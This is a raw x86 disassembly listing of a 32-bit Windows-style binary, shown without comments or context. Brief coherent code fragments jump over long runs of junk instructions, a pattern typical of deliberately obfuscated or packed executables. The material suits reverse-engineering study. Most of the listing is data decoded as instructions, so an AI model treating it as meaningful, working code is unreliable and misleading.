  40f810:	cmp    DWORD PTR ds:0x43364c,0x0
  40f817:	jbe    0x40f836
  40f81d:	jmp    0x40f836
  40f822:	push   DWORD PTR [ebp-0x14]
  40f825:	push   DWORD PTR [ebp-0x10]
  40f828:	push   DWORD PTR [ebp-0x10]
  40f82b:	push   0x3aa1
  40f830:	call   DWORD PTR ds:0x43c7d8
  40f836:	or     eax,ecx
  40f838:	mov    ecx,DWORD PTR [ebp-0x20]
  40f83b:	or     eax,0x3948
  40f840:	imul   eax,eax,0x6524
  40f846:	xor    eax,ecx
  40f848:	jmp    0x40f924
  40f84d:	pop    ebp
  40f84e:	iret   
  40f84f:	lods   al,BYTE PTR ds:[esi]
  40f850:	jle    0x40f810
  40f852:	jg     0x40f833
  40f854:	out    dx,eax
  40f855:	into   
  40f856:	add    bl,bl
  40f858:	dec    esi
  40f859:	jae    0x40f876
  40f85b:	loope  0x40f82a
  40f85d:	or     esp,DWORD PTR [edi+0xbf0000]
  40f863:	add    BYTE PTR [eax],al
  40f865:	inc    ebp
  40f866:	xor    esp,DWORD PTR [edx+0x64]
  40f869:	test   eax,0xdc826ed1
  40f86e:	mov    bl,0x29
  40f870:	popa   
  40f871:	adc    eax,0x75332f52
  40f876:	sbb    ebp,DWORD PTR [edx+ebp*1]
  40f879:	mov    bl,0x1d
  40f87b:	pop    ss
  40f87c:	adc    al,0xe4
  40f87e:	int    0x9
  40f880:	xor    BYTE PTR [edx],ah
  40f882:	add    ebx,DWORD PTR [ecx+0x4f]
  40f885:	jecxz  0x40f8d1
  40f887:	(bad)  
  40f888:	test   eax,0xad9c5d6d
  40f88d:	adc    al,0x94
  40f88f:	ret    
  40f890:	ss dec ebx
  40f892:	pop    ebp
  40f893:	jnp    0x40f8ca
  40f895:	push   ds
  40f896:	cmc    
  40f897:	(bad)  
  40f898:	and    BYTE PTR [edx+0x62],cl
  40f89b:	loope  0x40f877
  40f89d:	sbb    al,ch
  40f89f:	shr    BYTE PTR [esi+0x5707ff64],1
  40f8a5:	std    
  40f8a6:	xchg   ebp,eax
  40f8a7:	mov    esi,0x5b07c87b
  40f8ac:	shl    BYTE PTR [edx+0x1a],1
  40f8af:	stos   DWORD PTR es:[edi],eax
  40f8b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8b1:	pop    esi
  40f8b2:	ror    BYTE PTR [ebp+0x75],1
  40f8b5:	mov    cl,0xcb
  40f8b7:	inc    edi
  40f8b8:	sub    al,0xfb
  40f8ba:	jmp    0x40f90c
  40f8bc:	ja     0x40f92e
  40f8be:	retf   0xa121
  40f8c1:	xchg   ebx,eax
  40f8c2:	out    dx,al
  40f8c3:	jnp    0x40f8d8
  40f8c5:	pop    edx
  40f8c6:	fwait
  40f8c7:	clc    
  40f8c8:	aam    0x78
  40f8ca:	inc    esp
  40f8cb:	xchg   ecx,ecx
  40f8cd:	dec    esi
  40f8ce:	cmp    dl,BYTE PTR [edi+edi*1-0x4f3ff6f0]
  40f8d5:	mov    esp,0xbd12a759
  40f8da:	(bad)  
  40f8db:	icebp  
  40f8dc:	in     al,0x6e
  40f8de:	mov    BYTE PTR [ebp-0x6871ebf7],cl
  40f8e4:	popa   
  40f8e5:	scas   eax,DWORD PTR es:[edi]
  40f8e6:	(bad)  
  40f8e7:	push   edx
  40f8e8:	sahf   
  40f8e9:	hlt    
  40f8ea:	out    0x5d,al
  40f8ec:	pushf  
  40f8ed:	jo     0x40f8ca
  40f8ef:	fnstcw WORD PTR [ecx]
  40f8f1:	in     eax,0xdf
  40f8f3:	mov    WORD PTR [edi],ds
  40f8f5:	fisubr DWORD PTR ds:[ebx-0x4f4182ce]
  40f8fc:	aad    0xff
  40f8fe:	pushf  
  40f8ff:	add    bl,BYTE PTR [esi-0x242d71c5]
  40f905:	xlat   BYTE PTR ds:[ebx]
  40f906:	es push 0x28
  40f909:	add    esp,DWORD PTR [ecx-0x5e]
  40f90c:	inc    eax
  40f90d:	cmp    dl,BYTE PTR [ebp+0x3b01fa92]
  40f913:	jne    0x40f98b
  40f915:	jmp    0x5d81fdae
  40f91a:	pop    ecx
  40f91b:	fbstp  TBYTE PTR [edi+0x4d]
  40f91e:	mov    BYTE PTR [ebp-0x3f733461],bh
  40f924:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f927:	imul   eax,ecx
  40f92a:	jmp    0x40fa06
  40f92f:	cdq    
  40f930:	pop    eax
  40f931:	pop    ss
  40f932:	(bad)  
  40f934:	(bad)  
  40f936:	pop    eax
  40f937:	xchg   edi,eax
  40f938:	push   0xffffffb3
  40f93a:	fdivrp st(6),st
  40f93c:	test   dl,bh
  40f93e:	or     eax,0xa7ca
  40f943:	mov    edi,0x52000000
  40f948:	jl     0x40f9b8
  40f94a:	in     eax,dx
  40f94b:	push   0x332b9c6e
  40f950:	dec    ecx
  40f951:	mov    ah,0x74
  40f953:	retf   
  40f954:	mov    esp,0x76170283
  40f959:	cdq    
  40f95a:	(bad)  
  40f95c:	sbb    DWORD PTR [esi],ebp
  40f95e:	xor    al,0xc7
  40f960:	jae    0x40f9cc
  40f962:	jl     0x40f9af
  40f964:	cmp    ah,BYTE PTR [ebp+0x17]
  40f967:	add    DWORD PTR [eax],edi
  40f969:	ret    
  40f96a:	mov    cl,0x42
  40f96c:	xchg   ecx,eax
  40f96d:	lods   eax,DWORD PTR ds:[esi]
  40f96e:	and    BYTE PTR [edx-0x7f],dl
  40f971:	or     al,BYTE PTR [eax+0x55]
  40f974:	adc    dl,BYTE PTR [edi-0x25]
  40f977:	cs sub eax,0xff6ca9c0
  40f97d:	mov    ah,dh
  40f97f:	outs   dx,DWORD PTR ds:[esi]
  40f980:	inc    esp
  40f981:	dec    edx
  40f982:	xor    eax,0xaabe83f0
  40f987:	retf   0x1a04
  40f98a:	inc    edi
  40f98b:	jnp    0x40f9b2
  40f98d:	rsqrtps xmm1,xmm1
  40f990:	imul   ebx,DWORD PTR [edi-0x58529b4e],0x9c70ee35
  40f99a:	shl    BYTE PTR [eax],1
  40f99c:	xor    DWORD PTR [ebp-0x11d60164],esi
  40f9a2:	mov    edi,0xcfb3d081
  40f9a7:	push   esi
  40f9a8:	pop    esi
  40f9a9:	mov    bl,BYTE PTR [ebx-0xdd043ac]
  40f9af:	sbb    eax,DWORD PTR [ecx-0x3654b474]
  40f9b5:	jl     0x40f9ce
  40f9b7:	adc    ebx,DWORD PTR [ebx]
  40f9b9:	call   0x2f8828d4
  40f9be:	cvtps2pi mm7,QWORD PTR [ebx]
  40f9c1:	cld    
  40f9c2:	arpl   WORD PTR [eax+0x1d7c9996],cx
  40f9c8:	inc    esi
  40f9c9:	daa    
  40f9ca:	(bad)  
  40f9cb:	xor    DWORD PTR [ebx+0x5f34d14c],edi
  40f9d1:	xchg   ebx,eax
  40f9d2:	inc    edx
  40f9d3:	test   DWORD PTR ds:0x1017b7ae,eax
  40f9d9:	les    ebx,FWORD PTR [ebp+ebx*4-0x7b573074]
  40f9e0:	inc    esp
  40f9e1:	out    0x2c,al
  40f9e3:	cmp    bh,0x7f
  40f9e6:	mov    eax,ds:0x11d69531
  40f9eb:	jmp    0x5a200ae6
  40f9f0:	sbb    eax,0x7d2274f6
  40f9f5:	test   eax,0x35fb90ae
  40f9fa:	xor    DWORD PTR [eax],edi
  40f9fc:	out    dx,al
  40f9fd:	ja     0x40fa71
  40f9ff:	daa    
  40fa00:	mov    al,0x62
  40fa02:	mov    dl,0x82
  40fa04:	cmp    edi,DWORD PTR [ecx+0x35]
  40fa07:	mov    al,ds:0x3abd955
  40fa0c:	inc    ebp
  40fa0d:	cld    
  40fa0e:	mov    edi,DWORD PTR ds:0x430010
  40fa14:	mov    ecx,DWORD PTR ds:0x43001c
  40fa1a:	sub    edi,ecx
  40fa1c:	or     edi,DWORD PTR [edi+ecx*1]
  40fa1f:	mov    DWORD PTR [ebp-0x4],eax
  40fa22:	or     edx,edx
  40fa24:	mov    eax,DWORD PTR [ebp-0x2c]
  40fa27:	sub    edx,edx
  40fa29:	imul   eax,eax,0xbe
  40fa2f:	jmp    0x40fb0b
  40fa34:	stos   BYTE PTR es:[edi],al
  40fa35:	jl     0x40f9e4
  40fa37:	mov    esp,0x7ebbfdff
  40fa3c:	mov    cl,0xe7
  40fa3e:	push   esi
  40fa3f:	pop    edi
  40fa40:	adc    ebp,DWORD PTR [ebp-0x6]
  40fa43:	fimul  WORD PTR [ecx-0x40ffff58]
  40fa49:	add    BYTE PTR [eax],al
  40fa4b:	add    BYTE PTR [eax-0x65],bl
  40fa4e:	pop    esi
  40fa4f:	push   DWORD PTR [ebx-0x7436d414]
  40fa55:	jb     0x40f9ec
  40fa57:	xchg   esi,eax
  40fa58:	out    dx,eax
  40fa59:	jb     0x40fab6
  40fa5b:	je     0x40fab1
  40fa5d:	ins    DWORD PTR es:[edi],dx
  40fa5e:	or     ah,BYTE PTR [eax]
  40fa60:	xchg   esp,eax
  40fa61:	(bad)  
  40fa62:	out    dx,eax
  40fa63:	je     0x40fa4b
  40fa65:	jecxz  0x40fa3c
  40fa67:	out    dx,eax
  40fa68:	loop   0x40fa23
  40fa6a:	mov    esp,DWORD PTR [ecx]
  40fa6c:	dec    edi
  40fa6d:	push   eax
  40fa6e:	fisubr WORD PTR [esp+eax*2]
  40fa71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa72:	sub    edx,DWORD PTR [eax-0x6b]
  40fa75:	pop    es
  40fa76:	pop    edi
  40fa77:	fidivr DWORD PTR [edx]
  40fa79:	mov    es,WORD PTR [edi+0x257fdeb]
  40fa7f:	fsubr  QWORD PTR [eax-0x4a]
  40fa82:	and    DWORD PTR [edi],esi
  40fa84:	out    dx,eax
  40fa85:	pop    eax
  40fa86:	push   esp
  40fa87:	mov    cl,0xa3
  40fa89:	xlat   BYTE PTR ds:[ebx]
  40fa8a:	repnz fstp TBYTE PTR [eax-0x3fd508cf]
  40fa91:	adc    al,0x99
  40fa93:	pusha  
  40fa94:	xor    bh,ah
  40fa96:	mov    ds:0xc45635bc,al
  40fa9b:	add    edx,DWORD PTR [ebx+0x3c]
  40fa9e:	mov    dh,0xc6
  40faa0:	ror    DWORD PTR [esi+0x4591fa1e],cl
  40faa6:	ins    WORD PTR es:[edi],dx
  40faa8:	aam    0x8f
  40faaa:	jno    0x40fac8
  40faac:	sti    
  40faad:	out    0xc5,eax
  40faaf:	dec    edi
  40fab0:	in     al,dx
  40fab1:	jbe    0x75b78db6
  40fab7:	dec    edx
  40fab8:	sub    esi,DWORD PTR [esi+0x7cd3dd13]
  40fabe:	rcr    esi,cl
  40fac0:	pusha  
  40fac1:	cmp    DWORD PTR [ebp+0x278fa7a5],edx
  40fac7:	(bad)  
  40fac9:	clc    
  40faca:	(bad)  
  40facb:	mul    DWORD PTR [esi+0x5952c07c]
  40fad1:	cmc    
  40fad2:	jno    0x40fb22
  40fad4:	pop    esp
  40fad5:	pop    esp
  40fad6:	sub    al,0xcb
  40fad8:	xchg   edi,eax
  40fad9:	lods   al,BYTE PTR ds:[esi]
  40fada:	or     ecx,DWORD PTR [ecx+0x52]
  40fadd:	mov    esi,0xedee052d
  40fae2:	loop   0x40fabb
  40fae4:	cmp    edi,DWORD PTR [ecx+edi*4-0x2adef27d]
  40faeb:	aam    0x97
  40faed:	jo     0x40faa1
  40faef:	dec    BYTE PTR ds:0xd6c08040
  40faf5:	or     ebx,ebx
  40faf7:	pop    es
  40faf8:	adc    dl,dh
  40fafa:	fsubr  DWORD PTR [esi-0x60]
  40fafd:	jg     0x40fb4d
  40faff:	pop    edi
  40fb00:	push   cs
  40fb01:	push   ecx
  40fb02:	sbb    dh,BYTE PTR [ebx+0x3e]
  40fb05:	jl     0x40fa98
  40fb07:	pop    ss
  40fb08:	add    DWORD PTR ds:0x70230ddb,0x0
  40fb0f:	add    BYTE PTR [ebx],dh
  40fb11:	ror    BYTE PTR [ebx],cl
  40fb13:	adc    eax,0x432038
  40fb18:	mov    edx,DWORD PTR [edx]
  40fb1a:	add    DWORD PTR ds:0x433628,edx
  40fb20:	add    eax,DWORD PTR [ebp-0x34]
  40fb23:	mov    ecx,DWORD PTR ds:0x4336a8
  40fb29:	mov    edx,DWORD PTR ds:0x4336dc
  40fb2f:	sub    ecx,edx
  40fb31:	xor    ecx,DWORD PTR [ecx+edx*1]
  40fb34:	jmp    0x40fc10
  40fb39:	push   es
  40fb3a:	xchg   ebp,eax
  40fb3b:	mov    cl,0x51
  40fb3d:	mov    bl,0x75
  40fb3f:	out    0xd7,al
  40fb41:	data16 cmp ch,BYTE PTR [esi]
  40fb44:	fiadd  WORD PTR [esi+0xd]
  40fb47:	fistp  QWORD PTR [eax]
  40fb49:	dec    eax
  40fb4a:	test   eax,0xbf0000
  40fb4f:	add    BYTE PTR [eax],al
  40fb51:	or     BYTE PTR [edi+0x33],bh
  40fb54:	sub    eax,0x976d80ee
  40fb59:	or     bl,BYTE PTR [esi]
  40fb5b:	fld    st(5)
  40fb5d:	mov    ch,BYTE PTR [edx]
  40fb5f:	loope  0x40fb9c
  40fb61:	and    eax,0x3f2ddcf
  40fb66:	mov    al,dl
  40fb68:	cdq    
  40fb69:	in     al,dx
  40fb6a:	jne    0x40fb8b
  40fb6c:	push   ebp
  40fb6d:	hlt    
  40fb6e:	shr    DWORD PTR [esp+edi*1+0x7f],0xd3
  40fb73:	mov    ds:0x89dee36c,al
  40fb78:	out    dx,eax
  40fb79:	hlt    
  40fb7a:	sbb    ch,BYTE PTR [eax]
  40fb7c:	push   cs
  40fb7d:	es dec ecx
  40fb7f:	jp     0x40fbb7
  40fb81:	or     dl,BYTE PTR [edi-0x35]
  40fb84:	nop
  40fb85:	lds    eax,FWORD PTR [eax-0x33]
  40fb88:	repz shr al,cl
  40fb8b:	stos   BYTE PTR es:[edi],al
  40fb8c:	daa    
  40fb8d:	gs add dh,dl
  40fb90:	idiv   dh
  40fb92:	in     al,0xd7
  40fb94:	jecxz  0x40fb33
  40fb96:	jg     0x40fb20
  40fb98:	hlt    
  40fb99:	inc    esi
  40fb9a:	call   0xcfdf1c31
  40fb9f:	add    BYTE PTR [ecx],0x76
  40fba2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fba3:	rol    ebp,1
  40fba5:	add    al,0x38
  40fba7:	leave  
  40fba8:	xor    eax,0xb2a0e05e
  40fbad:	cmp    DWORD PTR [eax-0x47],ebx
  40fbb0:	in     al,0xbe
  40fbb2:	loop   0x40fb5e
  40fbb4:	out    0x36,eax
  40fbb6:	es es jg 0x40fb64
  40fbba:	mov    ah,0x44
  40fbbc:	in     al,dx
  40fbbd:	cmp    eax,0x52f0d256
  40fbc2:	push   ss
  40fbc3:	sbb    bl,BYTE PTR [ebp+edx*4-0x44]
  40fbc7:	sub    edx,edx
  40fbc9:	pop    esi
  40fbca:	ror    DWORD PTR [eax],cl
  40fbcc:	sub    eax,0xcae3bc9b
  40fbd1:	jno    0x40fbcc
  40fbd3:	jb     0x40fbbd
  40fbd5:	push   0x3c61bf12
  40fbda:	daa    
  40fbdb:	lods   al,BYTE PTR ds:[esi]
  40fbdc:	push   edi
  40fbdd:	nop
  40fbde:	sar    DWORD PTR [ebx],1
  40fbe0:	xchg   edx,eax
  40fbe1:	imul   ecx,DWORD PTR [esi-0x2628cc59],0xffffffb0
  40fbe8:	sbb    BYTE PTR [edx-0x596eb6cf],dl
  40fbee:	out    0x1b,eax
  40fbf0:	push   ebp
  40fbf1:	or     BYTE PTR ds:0xf6b5d120,bl
  40fbf7:	shl    BYTE PTR [edx-0x62],cl
  40fbfa:	xor    dl,ch
  40fbfc:	jb     0x40fbd3
  40fbfe:	sub    bl,dh
  40fc00:	mov    eax,0x80d100d8
  40fc05:	mov    ecx,0xb32406d4
  40fc0a:	bound  ecx,QWORD PTR [edx-0x22]
  40fc0d:	jbe    0x40fc87
  40fc0f:	mov    ds:0x3c44d8b,al
  40fc14:	(bad)  
  40fc15:	and    eax,ecx
  40fc17:	or     eax,0x86
  40fc1c:	jmp    0x40fcf8
  40fc21:	jp     0x40fbce
  40fc23:	xor    BYTE PTR [ebx-0x404440f],ah
  40fc29:	outs   dx,DWORD PTR ds:[esi]
  40fc2a:	mov    ecx,0xf73167f1
  40fc2f:	add    eax,0xaa0739
  40fc34:	add    BYTE PTR [edi+0x2e000000],bh
  40fc3a:	push   ebx
  40fc3b:	ret    0x464
  40fc3e:	cld    
  40fc3f:	popf   
  40fc40:	jne    0x40fbcb
  40fc42:	xor    eax,0xed35a9f5
  40fc47:	mov    ebp,0xdf3f1dc8
  40fc4c:	test   eax,0x136fed51
  40fc51:	das    
  40fc52:	mov    cl,0x66
  40fc54:	arpl   WORD PTR [esi+0x5f],di
  40fc57:	or     eax,0x6e8443f9
  40fc5c:	fcmovne st,st(4)
  40fc5e:	clc    
  40fc5f:	std    
  40fc60:	adc    edx,DWORD PTR ds:[ebx]
  40fc63:	aam    0xaf
  40fc65:	mov    ecx,0x399ff89
  40fc6a:	lahf   
  40fc6b:	and    eax,0xdf43ffb4
  40fc70:	in     al,0xb4
  40fc72:	outs   dx,DWORD PTR ds:[esi]
  40fc73:	jbe    0x40fc67
  40fc75:	mov    edi,0xb50896da
  40fc7a:	call   0x96afa09c
  40fc7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc80:	call   0xd757:0x720b875f
  40fc87:	sub    al,0xe0
  40fc89:	fld    DWORD PTR [ebp-0x5e52690e]
  40fc8f:	and    al,BYTE PTR [edx+0x3876979a]
  40fc95:	mov    ebx,DWORD PTR [edi]
  40fc97:	iret   
  40fc98:	test   ch,0x5
  40fc9b:	push   ds
  40fc9c:	jg     0x40fcc3
  40fc9e:	test   al,0x51
  40fca0:	add    dl,ch
  40fca2:	(bad)  
  40fca3:	xchg   ecx,eax
  40fca4:	pop    eax
  40fca5:	int    0xaa
  40fca7:	or     cl,BYTE PTR [ebx+0x30]
  40fcaa:	(bad)  
  40fcab:	fst    QWORD PTR [ecx+eax*4-0x47]
  40fcaf:	mov    ch,0x5e
  40fcb1:	lea    ecx,[ebx-0x4f64be71]
  40fcb7:	(bad)  
  40fcb9:	imul   ebx,ebp,0x6d
  40fcbc:	(bad)  
  40fcbd:	out    0xfb,eax
  40fcbf:	fisubr WORD PTR [edi+0x458161d9]
  40fcc5:	push   edx
  40fcc6:	enter  0x6a86,0x5a
  40fcca:	pop    ss
  40fccb:	in     al,0x99
  40fccd:	jg     0x40fc8e
  40fccf:	imul   ebp,DWORD PTR [ecx+0x74],0xffffff8c
  40fcd3:	stc    
  40fcd4:	mov    al,BYTE PTR [edi-0x1e65943d]
  40fcda:	leave  
  40fcdb:	mov    ah,0xe9
  40fcdd:	push   esi
  40fcde:	pop    esp
  40fcdf:	std    
  40fce0:	push   esi
  40fce1:	adc    ch,BYTE PTR [edx-0x213efd7a]
  40fce7:	inc    esp
  40fce8:	fsub   QWORD PTR [ebp-0x55]
  40fceb:	jno    0x40fd6c
  40fced:	dec    ecx
  40fcee:	dec    ecx
  40fcef:	mov    esp,0xd721fcdd
  40fcf4:	dec    edi
  40fcf5:	hlt    
  40fcf6:	sbb    al,0xc8
  40fcf8:	xor    eax,0x50e6
  40fcfd:	mov    edi,DWORD PTR ds:0x4336d4
  40fd03:	mov    edi,DWORD PTR [edi]
  40fd05:	adc    DWORD PTR ds:0x433544,edi
  40fd0b:	add    eax,DWORD PTR [ebp+0x8]
  40fd0e:	mov    DWORD PTR [ebp-0x30],0xebeb4fd3
  40fd15:	cmp    DWORD PTR ds:0x433604,0x0
  40fd1c:	jg     0x40fd30
  40fd22:	jmp    0x40fd30
  40fd27:	push   DWORD PTR [ebp-0x10]
  40fd2a:	call   DWORD PTR ds:0x43c808
  40fd30:	mov    DWORD PTR [ebp-0x3c],eax
  40fd33:	mov    eax,0xffffdedc
  40fd38:	jmp    0x40fe14
  40fd3d:	ror    BYTE PTR [ebx],0x6a
  40fd40:	enter  0xe9eb,0xe2
  40fd44:	or     ebx,DWORD PTR [edi+ebx*8-0x7818b180]
  40fd4b:	data16 gs (bad) 
  40fd4e:	stos   BYTE PTR es:[edi],al
  40fd4f:	add    BYTE PTR [eax],al
  40fd51:	mov    edi,0x43000000
  40fd56:	add    edi,DWORD PTR [edx-0x2c]
  40fd59:	and    DWORD PTR [esi+0xafaee7f],ebp
  40fd5f:	fstp   QWORD PTR [edi+0x1b]
  40fd62:	xchg   ecx,eax
  40fd63:	in     al,dx
  40fd64:	repz mov al,0x3d
  40fd67:	mov    ebx,0xa9e3f9f1
  40fd6c:	or     al,0x9c
  40fd6e:	fcomp  QWORD PTR [esi]
  40fd70:	mov    dh,0x81
  40fd72:	pop    eax
  40fd73:	pusha  
  40fd74:	pop    edi
  40fd75:	sbb    eax,0xab19f5b7
  40fd7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd7b:	dec    ecx
  40fd7c:	mov    eax,0x1a1acba4
  40fd81:	mov    edx,0x20a472d2
  40fd86:	pop    edx
  40fd87:	mov    al,ds:0xe3c40751
  40fd8c:	repnz adc eax,0x52d15cc8
  40fd92:	out    dx,eax
  40fd93:	sub    BYTE PTR [edi+0x37506ba5],ch
  40fd99:	mov    al,ds:0x3913fd4f
  40fd9e:	into   
  40fd9f:	sbb    bl,BYTE PTR [eax-0x28]
  40fda2:	jns    0x40fdb7
  40fda4:	rol    BYTE PTR [eax-0x9],cl
  40fda7:	xor    DWORD PTR [edx],edi
  40fda9:	add    edx,esi
  40fdab:	push   ecx
  40fdac:	xor    eax,DWORD PTR [ecx+0x79]
  40fdaf:	out    0x93,al
  40fdb1:	sub    BYTE PTR [eax+ecx*8+0x513d8d6f],dh
  40fdb8:	fs div eax
  40fdbb:	jmp    0x79f1:0xa7c9013e
  40fdc2:	stc    
  40fdc3:	daa    
  40fdc4:	mov    esi,0x47347c0e
  40fdc9:	mov    ch,BYTE PTR [ecx+0x1a9a999f]
  40fdcf:	mul    DWORD PTR [ecx-0x55]
  40fdd2:	inc    ebp
  40fdd3:	fdivrp st(3),st
  40fdd5:	xchg   BYTE PTR [ecx+0x26786e33],cl
  40fddb:	ss jp  0x40fdce
  40fdde:	fnstenv [edi+0x10d38346]
  40fde4:	scas   al,BYTE PTR es:[edi]
  40fde5:	mov    esi,0x8dcc6b41
  40fdea:	addr16 dec edx
  40fdec:	out    dx,eax
  40fded:	lods   al,BYTE PTR ds:[esi]
  40fdee:	jle    0x40fd9b
  40fdf0:	sub    edx,eax
  40fdf2:	pop    ss
  40fdf3:	adc    al,0x76
  40fdf5:	mov    cl,0xc2
  40fdf7:	pop    ebx
  40fdf8:	pop    edx
  40fdf9:	loope  0x40fe08
  40fdfb:	les    esi,FWORD PTR [edi+edi*2-0x59]
  40fdff:	xchg   esi,eax
  40fe00:	mov    esi,0xa0d1a278
  40fe05:	nop
  40fe06:	mov    esp,0xd63916fe
  40fe0b:	jne    0x40fe64
  40fe0d:	mov    WORD PTR [ebp-0x17976aac],cs
  40fe13:	adc    eax,0xc7d44589
  40fe18:	inc    ebp
  40fe19:	enter  0x4fd4,0xeb
  40fe1d:	jmp    0x40fda8
  40fe1f:	inc    ebp
  40fe20:	int3   
  40fe21:	jmp    0x40fefd
  40fe26:	push   ebx
  40fe27:	push   eax
  40fe28:	and    edx,edx
  40fe2a:	and    esi,ebx
  40fe2c:	repz rcl DWORD PTR [ebp-0xf],1
  40fe30:	push   esi
  40fe31:	jp     0x40feaa
  40fe33:	in     eax,0xa6
  40fe35:	test   DWORD PTR [bp+di+0x0],ebp
  40fe3a:	mov    edi,0x0
  40fe3f:	and    DWORD PTR [ecx],ebx
  40fe41:	cdq    
  40fe42:	pop    esp
  40fe43:	push   esp
  40fe44:	add    ah,0x71
  40fe47:	mov    cl,0xb0
  40fe49:	fstp   QWORD PTR [ebx+eax*1]
  40fe4c:	inc    ebp
  40fe4d:	out    dx,al
  40fe4e:	pop    ebx
  40fe4f:	inc    esp
  40fe50:	jle    0x40fe92
  40fe52:	mov    esi,DWORD PTR [eax]
  40fe54:	sti    
  40fe55:	add    BYTE PTR [ebx+0x6d],cl
  40fe58:	pop    ds
  40fe59:	(bad)  [edx]
  40fe5b:	adc    ch,cl
  40fe5d:	dec    esi
  40fe5e:	or     al,0x9b
  40fe60:	sbb    DWORD PTR [ecx+0x646e4dcd],esi
  40fe66:	xchg   BYTE PTR [edx+0x4eb5e3bf],bh
  40fe6c:	out    0xb7,al
  40fe6e:	jmp    0x7e7:0xc821b5b1
  40fe75:	bound  ecx,QWORD PTR [edx+0x22]
  40fe78:	inc    ebx
  40fe79:	test   eax,0xf373e68f
  40fe7e:	add    BYTE PTR [ebp+0x1fa0aa74],dl
  40fe84:	ja     0x40fe28
  40fe86:	sub    eax,DWORD PTR [ebp+0xf6c30dc]
  40fe8c:	xor    ah,BYTE PTR [esi-0x2ec1061a]
  40fe92:	xor    BYTE PTR ds:0x9ba3377f,bl
  40fe98:	dec    esi
  40fe99:	jp     0x40fe60
  40fe9b:	pushf  
  40fe9c:	mov    esp,0x6a2de9ab
  40fea1:	fwait
  40fea2:	clc    
  40fea3:	or     esp,DWORD PTR [ecx-0x72d3dc6]
  40fea9:	les    ebp,FWORD PTR [ecx+0x2e04ba9f]
  40feaf:	jmp    0x40ff1a
  40feb1:	pop    es
  40feb2:	and    ebp,edi
  40feb4:	mov    edx,cs
  40feb6:	nop
  40feb7:	aas    
  40feb8:	xor    edx,eax
  40feba:	push   es
  40febb:	or     al,0xd7
  40febd:	jge    0x40fed6
  40febf:	inc    esi
  40fec0:	xor    BYTE PTR [edx-0x69bc8548],cl
  40fec6:	outs   dx,DWORD PTR ds:[esi]
  40fec7:	ret    
  40fec8:	scas   eax,DWORD PTR es:[edi]
  40fec9:	sbb    ecx,eax
  40fecb:	std    
  40fecc:	das    
  40fecd:	or     al,0xe8
  40fecf:	out    0x28,eax
  40fed1:	(bad)  
  40fed2:	or     BYTE PTR [edx+0x3d348fc],bh
  40fed8:	push   ds
  40fed9:	fs push es
  40fedb:	mov    dh,0x1c
  40fedd:	and    ah,BYTE PTR [ecx]
  40fedf:	rcr    BYTE PTR [edi],1
  40fee1:	inc    ecx
  40fee2:	mov    esp,DWORD PTR [edx-0x3f1f7ab1]
  40fee8:	cs adc al,0x55
  40feeb:	dec    edi
  40feec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40feed:	or     BYTE PTR [eax+ecx*8],dh
  40fef0:	xlat   BYTE PTR ds:[ebx]
  40fef1:	ins    BYTE PTR es:[edi],dx
  40fef2:	sub    al,0x29
  40fef4:	jle    0x40ff02
  40fef6:	or     al,0x65
  40fef8:	push   ecx
  40fef9:	(bad)
  40fefd:	mov    edx,DWORD PTR [ebp-0x38]
  40ff00:	mov    ecx,DWORD PTR [ebp-0x34]
  40ff03:	sbb    DWORD PTR ds:0x4335b0,edi
  40ff09:	mov    esi,DWORD PTR [ebp-0x30]
  40ff0c:	mov    edi,DWORD PTR [ebp-0x2c]
  40ff0f:	mov    ecx,0x8dacd260
  40ff14:	xor    edx,ecx
  40ff16:	or     DWORD PTR ds:0x4335e4,0x43361c
  40ff20:	xor    esi,ecx
  40ff22:	mov    eax,0x66479db3
  40ff27:	sbb    DWORD PTR ds:0x433544,0x359c
  40ff31:	jmp    0x41000d
  40ff36:	sub    eax,0xb7ef831b
  40ff3b:	jmp    FWORD PTR [ebp-0x25]
  40ff3e:	pushf  
  40ff3f:	in     eax,0x1a
  40ff41:	lahf   
  40ff42:	dec    ebp
  40ff43:	add    edx,ecx
  40ff45:	add    al,BYTE PTR [esp+ebp*4+0x0]
  40ff49:	add    BYTE PTR [edi+0x25000000],bh
  40ff4f:	xchg   esp,eax
  40ff50:	jle    0x40ff9f
  40ff52:	imul   edi,ebp,0x86b2d838
  40ff58:	add    BYTE PTR [edx-0x7bf59321],0x3a
  40ff5f:	mov    dh,0xfc
  40ff61:	xlat   BYTE PTR ds:[ebx]
  40ff62:	xor    bl,ah
  40ff64:	inc    ecx
  40ff65:	jne    0x40ff8e
  40ff67:	scas   al,BYTE PTR es:[edi]
  40ff68:	sbb    edi,DWORD PTR [ecx+ebp*2]
  40ff6b:	popa   
  40ff6c:	ins    BYTE PTR es:[edi],dx
  40ff6d:	sar    BYTE PTR [edi],1
  40ff6f:	pop    ecx
  40ff70:	loop   0x40ff1b
  40ff72:	outs   dx,BYTE PTR ds:[esi]
  40ff73:	sub    ecx,DWORD PTR [ecx]
  40ff75:	out    0x44,al
  40ff77:	dec    esp
  40ff78:	adc    DWORD PTR [edx-0x527ce98f],esp
  40ff7e:	shl    BYTE PTR [esi*8-0xfc614da],0xc7
  40ff86:	add    DWORD PTR [edi],ebx
  40ff88:	jge    0x40ffa0
  40ff8a:	pop    ds
  40ff8b:	(bad)  
  40ff8c:	(bad)  
  40ff8d:	inc    edi
  40ff8e:	fnstenv [edi-0xf0c1bc9]
  40ff94:	xlat   BYTE PTR ds:[ebx]
  40ff95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff97:	fdivr  st,st(7)
  40ff99:	add    BYTE PTR [edx+0x6c4a2ae7],0xa0
  40ffa0:	stc    
  40ffa1:	dec    ebp
  40ffa2:	xchg   ebx,eax
  40ffa3:	adc    bl,cl
  40ffa5:	shl    esi,1
  40ffa7:	idiv   al
  40ffa9:	mul    BYTE PTR [esi]
  40ffab:	mov    eax,0xa4f20040
  40ffb0:	test   eax,0x456fea35
  40ffb5:	mov    bl,BYTE PTR [eax+ebp*4+0x9e8e9eb]
  40ffbc:	xchg   ecx,eax
  40ffbd:	call   0x3bc7:0xcdec93ec
  40ffc4:	pop    edi
